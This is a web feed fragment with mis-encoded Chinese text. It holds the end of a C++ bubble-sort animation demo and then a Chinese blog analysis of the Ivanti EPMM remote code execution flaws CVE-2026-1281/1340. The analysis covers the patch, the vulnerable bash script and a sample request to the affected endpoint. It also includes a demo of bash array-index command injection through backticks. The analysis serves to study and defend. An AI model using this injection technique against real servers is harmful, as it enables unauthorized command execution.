</span><span style="color: rgba(0, 0, 255, 1)">int</span> main(){        <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">ä¸»åè½å </span>
   g_screen-&gt;bgcolor(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">black</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">);
   </span><span style="color: rgba(0, 0, 255, 1)">int</span> n= randint(<span style="color: rgba(128, 0, 128, 1)">5</span>,<span style="color: rgba(128, 0, 128, 1)">8</span><span style="color: rgba(0, 0, 0, 1)">);
   </span><span style="color: rgba(0, 0, 255, 1)">int</span> x = <span style="color: rgba(128, 0, 128, 1)">50</span>-<span style="color: rgba(128, 0, 128, 1)">100</span>*n/<span style="color: rgba(128, 0, 128, 1)">2</span>;    <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">æå·¦è¾¹èç¹åæ (èµ·å§)</span>
   <span style="color: rgba(0, 0, 255, 1)">for</span>(<span style="color: rgba(0, 0, 255, 1)">int</span> i=<span style="color: rgba(128, 0, 128, 1)">0</span>;i&lt;n;i++){    <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å»ºç«nä¸ªèç¹ï¼æ¾å°datasä¸­</span>
      <span style="color: rgba(0, 0, 255, 1)">int</span> v = randint(<span style="color: rgba(128, 0, 128, 1)">30</span>,<span style="color: rgba(128, 0, 128, 1)">200</span><span style="color: rgba(0, 0, 0, 1)">);
      Node </span>*node = <span style="color: rgba(0, 0, 255, 1)">new</span><span style="color: rgba(0, 0, 0, 1)"> Node;
      node</span>-&gt;value =<span style="color: rgba(0, 0, 0, 1)"> v;
      node</span>-&gt;x =<span style="color: rgba(0, 0, 0, 1)"> x;
      </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">æé¡ºåºéæ©ç´¢å¼ä¸ºiçé¢è²ï¼ç»åæè§è²çé åå¾ç</span>
      <span style="color: rgba(0, 0, 255, 1)">string</span> s = <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">res/circle_</span><span style="color: rgba(128, 0, 0, 1)">"</span> + colors[i] + <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">.png</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">;
      Sprite </span>*js = <span style="color: rgba(0, 0, 255, 1)">new</span> Sprite(s); <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">æ°å»ºè§è²ï¼ä»¥sä¸ºé å</span>
      js-&gt;scale(v/<span style="color: rgba(128, 0, 128, 1)">100.0</span>);        <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">æè§è²ç¼©å°ï¼è¦ä¸ç¶å¤ªå¤§äº</span>
      js-&gt;penup();  js-&gt;go(x,<span style="color: rgba(128, 0, 128, 1)">0</span>); js-&gt;speed(<span style="color: rgba(128, 0, 128, 1)">1</span>); <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å®å¥½èµ·å§ä½ç½®</span>
      node-&gt;sp = js;             <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">èç¹åå«æè§è²æé</span>
<span style="color: rgba(0, 0, 0, 1)">      datas.push_back(node);      
      x </span>= x + <span style="color: rgba(128, 0, 128, 1)">100</span>;     <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">æ¯ä¸ªèç¹ç¸å·®100ä¸ªåä½</span>
<span style="color: rgba(0, 0, 0, 1)">   }
   Sprite pen{</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">blank</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">}; 
   pen.up().color(</span><span style="color: rgba(128, 0, 128, 1)">0</span>).sety(<span style="color: rgba(128, 0, 128, 1)">300</span>).write(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">åæ³¡æåºç®æ³å¯è§åæ¼ç¤ºç¨åº</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 128, 1)">50</span><span style="color: rgba(0, 0, 0, 1)">);
   pen.color(</span><span style="color: rgba(128, 0, 128, 1)">30</span>).sety(<span style="color: rgba(128, 0, 128, 1)">230</span>).write(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">ä½èï¼æå´ç,éç¨C++ç²¾çµåº</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 128, 1)">30</span><span style="color: rgba(0, 0, 0, 1)">);
   pen.color(</span><span style="color: rgba(128, 0, 128, 1)">60</span>).sety(<span style="color: rgba(128, 0, 128, 1)">180</span>).write(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">C++ç²¾çµåºä½èï¼æå´ç</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 128, 1)">20</span><span style="color: rgba(0, 0, 0, 1)">);
   rocket.wait(</span><span style="color: rgba(128, 0, 128, 1)">1</span>).color(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">yellow</span><span style="color: rgba(128, 0, 0, 1)">"</span>).penup().sety(<span style="color: rgba(128, 0, 128, 1)">130</span><span style="color: rgba(0, 0, 0, 1)">).hide();
   </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">çæ­£çåæ³¡æåºæ ¸å¿ç¨åºå¼å§äº</span>
   <span style="color: rgba(0, 0, 255, 1)">for</span>(<span style="color: rgba(0, 0, 255, 1)">int</span> j=<span style="color: rgba(128, 0, 128, 1)">1</span>;j&lt;n;j++){  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">æåºçæ ¸å¿ç¨åºå¨è¿é</span>
      <span style="color: rgba(0, 0, 255, 1)">string</span> s = <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">ç¬¬ </span><span style="color: rgba(128, 0, 0, 1)">"</span> + to_string(j) + <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)"> è½®</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">;    
      </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å é¤ææ©åçæå­ï¼ç¶ååä¸æ°çæå­ï¼å¹¶ä¸ç­å¾1ç§  </span>
      rocket.cleartxts(<span style="color: rgba(128, 0, 128, 1)">1</span>).write(s,<span style="color: rgba(128, 0, 128, 1)">42</span>).wait(<span style="color: rgba(128, 0, 128, 1)">1</span><span style="color: rgba(0, 0, 0, 1)">);
      </span><span style="color: rgba(0, 0, 255, 1)">for</span>(<span style="color: rgba(0, 0, 255, 1)">int</span> i=<span style="color: rgba(128, 0, 128, 1)">0</span>;i&lt;n-j;i++<span style="color: rgba(0, 0, 0, 1)">)   
         </span><span style="color: rgba(0, 0, 255, 1)">if</span>(datas[i]-&gt;value &gt; datas[i+<span style="color: rgba(128, 0, 128, 1)">1</span>]-&gt;value ) <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">åç°æ´å¤§çï¼åäº¤æ¢</span>
             swap(i,i+<span style="color: rgba(128, 0, 128, 1)">1</span><span style="color: rgba(0, 0, 0, 1)">);
      rocket.wait(</span><span style="color: rgba(128, 0, 128, 1)">1</span><span style="color: rgba(0, 0, 0, 1)">);
   }
   rocket.cleartxts(</span><span style="color: rgba(128, 0, 128, 1)">1</span>).write(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">æ¼ç¤ºå®æ¯ï¼</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 128, 1)">42</span>).done();     <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å®æäº</span>
   <span style="color: rgba(0, 0, 255, 1)">return</span> <span style="color: rgba(128, 0, 128, 1)">0</span>;    <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">è¿å0</span>
}</pre>
</div>
<p>&nbsp;</p>

</div>
<div class="clear"></div>

	<div class="postDesc">posted on 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 20:14">2026-02-02 20:13</span>&nbsp;
<a href="https://www.cnblogs.com/lixingqiu">æå´ç</a>&nbsp;
éè¯»(<span id="post_view_count">61</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19566285);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19566285', targetLink: 'https://www.cnblogs.com/lixingqiu/p/19566285', title: 'ä¸ä¸ªææçç¼ç¨æå®¤ï¼çµèå±å¹ååçä¸ä½ç¨åºåï¼ä½ ï¼ï¼æè¾¹ç«çä¸ä½å¥½å¥çæåã' })">ä¸¾æ¥</a>
</div>
 ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ Ivanti EPMM RCE CVE-2026-1340/1281å®æ´åæ ]]></title>
    <link>https://www.cnblogs.com/mhtsec/p/19566043</link>
    <guid>0491d1702c6f689fe356f69d257a261b</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/mhtsec/p/19566043" title="åå¸äº 2026-02-02 18:41">
    <span role="heading" aria-level="2">Ivanti EPMM RCE CVE-2026-1340/1281å®æ´åæ</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="åè¨">åè¨ï¼</h2>
<p>æä¸­ææ¯åæä»ä¾äº¤æµè®¨è®ºï¼pocä»ä¾åæ³æµè¯ï¼ç¨äºä¼ä¸èªæ¥ï¼åå¿ç¨äºéæ³æµè¯ï¼æªæææµè¯é æåæç±ä½¿ç¨èæ¿æï¼ä¸æ¬å¬ä¼å·ä»¥åæ£è±ç³æ å³ã</p>
<h2 id="ä»ç»">ä»ç»ï¼</h2>
<p>è¿æ¥,Ivantiå¬å¸æ«é²äºIvanti Endpoint Manager Mobile (EPMM)ä¸­å­å¨çä»£ç æ³¨å¥æ¼æ´(<strong>CVE-2026-1281</strong>å<strong>CVE-2026-1340</strong>)ï¼å¹¶ç¡®è®¤<strong>å·²å­å¨å¨éå©ç¨</strong>ãè¯¥æ¼æ´æºäº Apache HTTPd è°ç¨ç Bash èæ¬å¨å¤çæ¶é´æ³æ¯è¾æ¶ï¼æªè½ææè¿æ»¤æ¶æåæ°ï¼å¯¼è´æ»å»èå¯å©ç¨ Bash ç®æ¯æ©å±ç¹æ§æ³¨å¥ç³»ç»å½ä»¤ã</p>
<h2 id="åæ">åæï¼</h2>
<p>é¦åæ¿å°è¡¥ä¸å</p>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021209948.png" class="lazyload"></p>
<p>RPMçåé£å°±å¥½åäºï¼ç´æ¥æ¥çå®æ§è¡äºä»ä¹å³å¯ï¼ä½¿ç¨å½ä»¤ï¼</p>
<pre><code>rpm -qp --scripts ivanti-security-update-1761642-1.0.0L-5.noarch.rpm
</code></pre>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021210121.png" class="lazyload"></p>
<p>emmmåå®¹æç¹å¤ï¼ä¸è¿æ ¹æ®å·²ç¥æ¡ä»¶ï¼è¯¥æ¼æ´æºäº Apache HTTPd ï¼è¡¥ä¸åéé¢å¾å®¹æçå°å³é®çä¿®æ¹Apache HTTPdéç½®çå½ä»¤ï¼</p>
<pre><code>/bin/sed -i \
  -e 's|RewriteMap mapAppStoreURL prg:/mi/bin/map-appstore-url|RewriteMap mapAppStoreURL "prg:/bin/java -cp /mi/bin AppStoreUrlMapper"|g' \
  -e 's|RewriteMap mapAftStoreURL prg:/mi/bin/map-aft-store-url|RewriteMap mapAftStoreURL "prg:/bin/java -cp /mi/bin AFTUrlMapper"|g' \
  /etc/httpd/conf.d/ssl.conf
</code></pre>
<p>å°±æ¯è¯´æ<code>map-appstore-url</code>å<code>map-aft-store-url</code>ç»æ¢æäºä¸ç¨æ¯å§ï¼okæä»¬å»ççè¿ä¿©èæ¬æ¯ä»ä¹ï¼ç®å½å·²ç»ç»äºå¨mi/binä¸ï¼æä»¬ç´æ¥è¿ç»ç«¯æ¥ä¸ä¸</p>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021216970.png" class="lazyload"></p>
<p>map-appstore-urlåmap-aft-store-urlæ¯ä¸ªbashèæ¬ï¼catå°±å¯ä»¥ç´æ¥çåå®¹(å¦ä¸ä¸ªèæ¬åå®¹å·®ä¸å¤ªå¤ï¼å°±ä¸å±ç¤ºäº)ã</p>
<pre><code>#!/bin/bash

set -o nounset

declare -x MI_DATE_COMMAND="date +%Y-%m-%d--%H-%M-%S"
declare -x MI_DATE_FORMAT="%Y-%m-%d--%H-%M-%S"

declare -r kScriptName=$(basename $0)
declare -r kScriptDirectory=$(dirname $0)
declare -r kLogFile="/var/log/${kScriptName}.log"
declare -r kSaltFile="/mi/files/appstore-salt.txt"

declare -r kScriptStartTimeSeconds=$(date +%s)
declare -r kValidTimeStampLength=${#kScriptStartTimeSeconds}

declare -r kAftFileStoreDirectory='/mi/files/aftstore'

# error codes that are used in /etc/httpd/conf.d/ssl.conf
declare -r kPathTraversalAttemptedErrorCode="c91bbeec40aff3fd3fe0c08044c1165a"
declare -r kLinkHashMismatchErrorCode="44b2ff3cf69c5112061aad51e0f7d772"
declare -r kTooLateErrorCode="c6a0e7ca11208b4f11d04a7ee8151a46"
declare -r kTooEarlyErrorCode="80862895184bfa4d00b24d4fbb3d942f"
declare -r kKeyIndexOutOfBoundsErrorCode="f74c27fce7d8e2fecd10ab54eda6bd85"
declare -r kURLStructureInvalidErrorCode="b702087a848177d489a6891bd7869495"
declare -r kTimestampLengthInvalidErrorCode="2ecad569fdaa07e2b66ed2595cf7240f"
declare -r kLinkSpoofErrorCode="cbfa488e9b08d4c5d7b3b2084ffb18e7"
declare -r kLinkUsingOddTraversalErrorCode="f489b91db387b684f56c07e7f5e4308b"

gShouldLogToFile="false"
gSaltFileModificationTime="0"
gTestMode="false"
gErrorCode=0
gErrorMessage=""
declare -a gSaltArray=( )
gCurrentSalt=""
gHostname=""
gPath=""
gStartTime=""
gEndTime=""

if (( $# &gt; 0 )) ; then
  gTestMode="true"
fi

#echo "gTestMode=${gTestMode}"

# information
function log() {
  if ${gTestMode} ; then
    echo "`$MI_DATE_COMMAND` -- ${kScriptName} -- ${1}: ${@:2}"
  else
    # do not log since it kills performance
    echo "$($MI_DATE_COMMAND) -- ${kScriptName} -- ${1}: ${@:2}" &gt;&gt; ${kLogFile}
  fi
}

function logDebug() {
  if ${gTestMode} ; then
    echo "`$MI_DATE_COMMAND` -- ${kScriptName} -- ${1}: ${@:2}"
  else
    # do not log since it kills performance
    ${gShouldLogToFile} &amp;&amp; echo "$($MI_DATE_COMMAND) -- ${kScriptName} -- ${1}: ${@:2}" &gt;&gt; ${kLogFile}
  fi
}

# errorCode
# information
function logDenial() {
  local theCurrentDate="$(MI_DATE_COMMAND)"
  if ${gTestMode} ; then
    echo "$theCurrentDate -- ${kScriptName} -- ${1}: denying: errorCode=${2}: ${@:3}"
  else
    #echo "$theCurrentDate -- ${kScriptName} -- ${1}: denying: errorCode=${2}: ${@:3}" &gt;&gt; "${kLogFile}"
    logger -t "${kScriptName}" -i -p local0.warning "$theCurrentDate -- ${1}: denying: errorCode=${2}: ${@:3}"
  fi
}

log "MAIN" "starting"

function dumpSaltArray() {
  log "${FUNCNAME}" "entered"

  for theSalt in "${gSaltArray[@]}" ; do
    log "${FUNCNAME}" "theSalt=$theSalt"
  done
}

log "MAIN" "after dumpSaltArray declaration"

function readSaltFile() {
  if [[ -f "${kSaltFile}" ]] ; then
    theCurrentSaltModificationTime=$(stat -c %Y "${kSaltFile}")
    logDebug "${FUNCNAME}" "theCurrentSaltModificationTime=${theCurrentSaltModificationTime}"
    theDeltaTime=$(($theCurrentSaltModificationTime - $gSaltFileModificationTime))
    logDebug "${FUNCNAME}" "theDeltaTime=${theDeltaTime}"

    if [[ "${theDeltaTime}" -ne 0 ]] ; then
      log "${FUNCNAME}" "theDeltaTime=${theDeltaTime} not zero; loading salt from kSaltFile=${kSaltFile}"
      gSaltArray=( $(cat ${kSaltFile}))
      gSaltArray[0]=""
      gSaltFileModificationTime=$theCurrentSaltModificationTime
    fi
  else
    log "${FUNCNAME}" "kSaltFile=${kSaltFile} not found"
  fi
}

log "MAIN" "after readSaltFile declaration"

#readSaltFile
#dumpSaltArray
#readSaltFile

function lookupSaltByIndex() {
#echo "$1 ${#gSaltArray[*]}"
  if [ "$1" -lt ${#gSaltArray[*]} ] ; then
    gCurrentSalt=${gSaltArray[$1]}
  else
    gCurrentSalt=""
  fi

  logDebug "${FUNCNAME}" "theKeyIndex=$1; gCurrentSalt=$gCurrentSalt"
}

log "MAIN" "after lookupSaltByIndex declaration"

function verifyURLConsistency () {
  logDebug "${FUNCNAME}" "${1}"
  local ret="" # this is what we eventually echo and it's the name of a file for httpd to send to the client or a pattern that Rewrite is aware of and kill the connection with the right HTTP error code
  #theAppStoreString=${1%%:*}
  #echo "${theAppStoreString}"
  #declare
  theOldIFS="${IFS}"
  local theArgumentArray

  # process what httpd gave us in $1 splitting on the _
  IFS="_" &amp;&amp; theArgumentArray=(${1})

  theAftStoreString=${theArgumentArray[0]}
  theAftStoreAssetGUIDWithExtension=${theArgumentArray[1]}
  gHostname=${theArgumentArray[2]}
  theURLString=${theArgumentArray[3]}
  #echo "${theAftStoreString}"

  # process what mifs really gave us in $1 splitting on the ,
  IFS="," &amp;&amp; theAftStoreKeyValueArray=(${theAftStoreString})

  IFS="${theOldIFS}"

  if (( ${#theArgumentArray[@]} != 4 )) ; then
    ret="${kURLStructureInvalidErrorCode}"
    log "${FUNCNAME}" "${ret}" "expecting 5 segments; actual=${#theArgumentArray[@]}"
  fi

  if [[ -z ${ret} ]] ; then
    for theKeyMapEntry in "${theAftStoreKeyValueArray[@]}" ; do
      theKey="${theKeyMapEntry%%=*}"
      theValue="${theKeyMapEntry##*=}"
      logDebug "${FUNCNAME}" "theKey=$theKey; theValue=$theValue"

      case ${theKey} in
        kid)
          gKeyIndex="${theValue}"
          ;;
        st)
          gStartTime="${theValue}"
          if (( ${#gStartTime} != "${kValidTimeStampLength}" )) ; then
            ret="${kTimestampLengthInvalidErrorCode}"
          fi
          ;;
        et)
          gEndTime="${theValue}"
          if (( ${#gEndTime} != "${kValidTimeStampLength}" )) ; then
            ret="${kTimestampLengthInvalidErrorCode}"
          fi
          ;;
        h)
          gHashPrefixString="${theValue}"
          ;;
        *)
          ret="${kURLStructureInvalidErrorCode}"
          logDenial "${FUNCNAME}" "${ret}" "unknown presented key=${theKey}; theValue=${theValue}"
          ;;
      esac
    done
  fi

  if [[ -z ${ret} ]] ; then
    lookupSaltByIndex ${gKeyIndex}

    if [[ -n "${gCurrentSalt}" ]] ; then
      logDebug "${FUNCNAME}" "continuing: gCurrentSalt=$gCurrentSalt"
      theCurrentTimeSeconds=$(date +%s)
      logDebug "${FUNCNAME}" "theCurrentTimeSeconds=${theCurrentTimeSeconds}"
      #theCurrentTimeSeconds=1336011206
      #theCurrentTimeSeconds=1336770818
      #gHostname="cot-0000001.mobileiron.com"
      #gHostname="qa42.mobileiron.com"

      if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]] ; then
        logDebug "${FUNCNAME}" "continuing: not too early"

        if [[ ${theCurrentTimeSeconds} -lt ${gEndTime} ]] ; then
          logDebug "${FUNCNAME}" "continuing: not too late"

          # calculate the path
          gPath=${theURLString/\/sha256:${theAftStoreString}/}
          theStringToHash="${gCurrentSalt}${gHostname}${gPath}${gStartTime}${gEndTime}"
          theAssetFile="${theAftStoreAssetGUIDWithExtension}"
          # the string to hash must end with the assetfile start end
          logDebug "${FUNCNAME}" "theStringToHash=${theStringToHash}"

          if [[ "${theStringToHash}" = *"${theAssetFile}${gStartTime}${gEndTime}" ]] ; then
            theSHA256Hash=$(echo -n "${theStringToHash}" | sha256sum)
            theSHA256Prefix=${theSHA256Hash:0:64}
            # theSHA256Prefix=${theSHA256Hash}
            logDebug "${FUNCNAME}" "theSHA256Hash=$theSHA256Hash; theSHA256Prefix=$theSHA256Prefix"

shopt -s nocasematch
            if [[ "${theSHA256Prefix}" = "${gHashPrefixString}" ]] ; then
              logDebug "${FUNCNAME}" "hash matched"

              if [[ "${theAssetFile}" = *..* ]] || [[ "${theAssetFile}" = .* ]] || [[ "${theAssetFile}" = /* ]]; then
                ret="${kPathTraversalAttemptedErrorCode}"
                logDenial "${FUNCNAME}" "${ret}" "getting spoofed: ${theAssetFile}"
              else
                ret="${kAftFileStoreDirectory}"/"${theAftStoreAssetGUIDWithExtension}"
              fi
            else
              ret="${kLinkHashMismatchErrorCode}"
              logDenial "${FUNCNAME}" "${ret}" "link hash mismatch: theSHA256Prefix=$theSHA256Prefix; gHashPrefixString=${gHashPrefixString}; ${1}"
            fi
          else
            ret="${kLinkSpoofErrorCode}"
            logDenial "${FUNCNAME}" "${ret}" "link being spoofed: theStringToHash=${theStringToHash}; requiredSuffix=${theAppStoreSubDirectory}/${theAppStoreAssetGUID}${theAppStoreAssetExtension}${gStartTime}${gEndTime}; ${1}"
          fi
shopt -u nocasematch
        else
          ret="${kTooLateErrorCode}"
          logDenial "${FUNCNAME}" "${ret}" "link too late: theCurrentTimeSeconds=${theCurrentTimeSeconds}; ${1}"
        fi
      else
        ret="${kTooEarlyErrorCode}"
        logDenial "${FUNCNAME}" "${ret}" "link too early: theCurrentTimeSeconds=${theCurrentTimeSeconds}; ${1}"
      fi
    else
      ret="${kKeyIndexOutOfBoundsErrorCode}"
      logDenial "${FUNCNAME}" "${ret}" "key index out of bounds: ${1}"
    fi
  else
    ret="${kURLStructureInvalidErrorCode}"
    logDenial "${FUNCNAME}" "${ret}" "URL not structurally correct: ${1}"
  fi
  # tell httpd what file to send (or error message)
  echo "${ret}"
}

if ${gTestMode} ; then
  readSaltFile
  verifyURLConsistency "${1}"
else
  logDebug "MAIN" looping
  readSaltFile

  while read theCurrentLine; do
    readSaltFile
    logDebug "MAIN" "${theCurrentLine}"
    verifyURLConsistency "${theCurrentLine}"
  done
fi


</code></pre>
<p>ä½åå®¹å¤ªå¤äºï¼æä»¬è¿æ¯è¯·AIèå¸å¸®æä»¬ç»ä¸åæä¸ä¸</p>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021237941.png" class="lazyload"></p>
<p>AIèå¸å¸®æä»¬åæå¹¶å¾å°äºä¸ä¸ªä¼ åè¯·æ±ï¼ç¶åæä»¬è¿å¾å»apacheçéç½®æä»¶ççå¥å£è·¯å¾æ¯ä»ä¹ï¼å¨/etc/httpd/conf.d/ssl.confæä»¶ä¸­æ¾æ¾ç¸å³çåå®¹,ç±äºéç½®æä»¶åå®¹å¤ªå¤äºè¿éå°±ä¸è´´äºï¼æä¹æå¾æ¾ï¼è¿æ¯è®©AIèå¸å¸®æä»¬æ¾æ¾å§ã</p>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021246450.png" class="lazyload"></p>
<p>deepseekèå¸è¿æ¯å¤ªåè§£äººæäºï¼ç´æ¥ç»äºä¸ä¸ªæ åè¯·æ±ï¼</p>
<pre><code>/mifs/c/appstore/fob/3/1120/sha256:kid=1,st=1666663066,et=1666670266,h=a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2/75dc90fe-6ae7-4377-913b-7248334d39dc.ipa
</code></pre>
<p>ä½è¿äºä¼ åå°bashä¸­ï¼å¹¶æ²¡ææ¾å°ææ¾çç´æ¥å½ä»¤æ§è¡çç¹ï¼è¿æ¶æä»¬éè¦åçè§£ä¸ä¸bashèæ¬ï¼é¦åçbashèæ¬ä¸­çå¼å¤´ï¼</p>
<pre><code>gKeyIndex=""
gStartTime=""
gEndTime=""
gHashPrefixString=""
gPath=""

IFS=',' read -ra theAppStoreKeyValueArray
</code></pre>
<p>èæ¬ä¼ç¨ <code>IFS=','</code> æä¼ å¥çåæ°åå²ææ°ç» <code>theAppStoreKeyValueArray</code>ï¼ä¼ ååæ¯è¿æ ·çæ°ç»ï¼</p>
<pre><code>["kid=1", "st=1444444444", "et=1444444444", "h=a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"]
</code></pre>
<p>ç¶åå¨ä¸æ¹æè¿æ ·çä¸æ®µå¾ªç¯ï¼</p>
<pre><code>  if [[ -z ${ret} ]] ; then
    for theKeyMapEntry in "${theAftStoreKeyValueArray[@]}" ; do
      theKey="${theKeyMapEntry%%=*}"
      theValue="${theKeyMapEntry##*=}"
</code></pre>
<p>å®æä¼ åçè¿äºåæ°ååå¼å¾ªç¯èµå¼ç»äºtheKeyåtheValueï¼ç¶ååè¢«èµå¼å°å¨å±åégKeyIndexãgStartTimeãgEndTimeãgHashPrefixStringä¸­ï¼ç»§ç»­è·ä¸å»ï¼ççè¿äºå¼å¨åªéç¨å°ã</p>
<p>keyåæ°èµå¼å°äºåégKeyIndexï¼æç»å¨è¿éåºç¨ï¼</p>
<pre><code>kAppStoreSaltFile="/mi/files/appstore-salt.txt"
gSalt="" 

if [[ -f ${kAppStoreSaltFile} ]]; then
  gSalt=$(sed -n "${gKeyIndex}p" "${kAppStoreSaltFile}")
  if [[ -z ${gSalt} ]]; then
    ret="${kSaltIndexInvalidErrorCode}"
    logDenial "${FUNCNAME}" "${ret}" "kid(${gKeyIndex}) is invalid (no salt found)"
  fi
else
  ret="${kSaltFileMissingErrorCode}"
  logDenial "${FUNCNAME}" "${ret}" "Salt file ${kAppStoreSaltFile} not found"
fi
</code></pre>
<p>å®æ¯ç¨æ¥è¯»å/mi/files/appstore-salt.txtå¯¹åºè¡çï¼è¿ä¸ªæä»¶éé¢çhashå¼è¯»ååºæ¥ç¨æ¥æ ¡éªåç»­åæ°ã</p>
<p>st åæ°æç»èµå¼ç»äºgStartTimeï¼åå«å¨ä¸¤ä¸ªå°æ¹è¢«è°ç¨ï¼</p>
<pre><code>kValidTimeStampLength=10 

case ${theKey} in
  st)
    gStartTime="${theValue}"
    if (( ${#gStartTime} != "${kValidTimeStampLength}" )); then
      ret="${kTimestampLengthInvalidErrorCode}"
    fi
    ;;
</code></pre>
<p>è¿éå¤æ­äºè¿ä¸ªåæ°æ¯å¦é¿åº¦ä¸º10ã</p>
<pre><code>theCurrentTimeSeconds=$(date +%s)

if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]]; then
  logDebug "${FUNCNAME}" "Current time(${theCurrentTimeSeconds}) &gt; start time(${gStartTime})"
  # ... 
else
  ret="${kRequestExpiredErrorCode}"
  logDenial "${FUNCNAME}" "${ret}" "Start time(${gStartTime}) is in the future"
fi
</code></pre>
<p>è¿éç¨æ¥æ¯è¾å½åæ¶é´æ¯å¦æäºè¯·æ±å¼å§æ¶é´ã</p>
<p>et åæ°ï¼gEndTimeï¼ågStartTimeçç¨å¤å·®ä¸å¤ï¼ä¹æ ¡éªäºé¿åº¦åç¨äºéªè¯å½åæ¶é´â¤ç»ææ¶é´ã</p>
<p>h åæ°ï¼gHashPrefixStringï¼æ¯ç¨äºhashæ ¡éªçå¼ã</p>
<p>çä¸å»è¿æ¯æ²¡æç´è§çå½ä»¤æ§è¡çä»£ç ï¼å«æ¥ï¼æä»¬åå¼å¥ä¸ä¸ªç¥è¯ç¹ã</p>
<p>é¦åç»å¤§å®¶çä¸ä¸ªèæ¬ï¼</p>
<pre><code>#!/bin/bash
arr="" 
var="arr[`echo 'hacked' &gt; ./hack_mht`0]"
[[ 1 -gt $var ]] 

if [[ -f ./hack_mht ]]; then
    echo "æ§è¡æåï¼"
else
    echo "æªæ§è¡"
fi
</code></pre>
<p>broä»¬è§å¾è¿ä¸ªèæ¬è½æåæ§è¡å½ä»¤åï¼</p>
<p>ç­æ¡ï¼</p>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021410761.png" class="lazyload"></p>
<p>ä¸ºä»ä¹ä¼è¿æ ·æï¼å ä¸ºå¨bashä¸­ï¼æ°å¼æ¯è¾åè½å¯ä»¥è§£æarray[index]è¿æ ·çæ°å¼ç´¢å¼ï¼indexä¼è¢«ä¼åè§£æä¸ºç®æ°è¡¨è¾¾å¼ï¼æ¯å¦array[1+1]ï¼ä¼åè®¡ç®1+1ï¼èbashåæä¸ä¸ªå½ä»¤æ¿æ¢çä¼åçº§è§åï¼å¦æä½ æarray[1+1]æ¹ä¸º</p>
<pre><code>array[`echo 111`]
</code></pre>
<p>ååæ§è¡è¢«åå¼å·åè£¹çå½ä»¤ï¼ä¸¾ä¾ï¼</p>
<pre><code>current_date=`date`
echo "ä»å¤©æ¯: $current_date"
echo "å½åç®å½: `pwd`"
</code></pre>
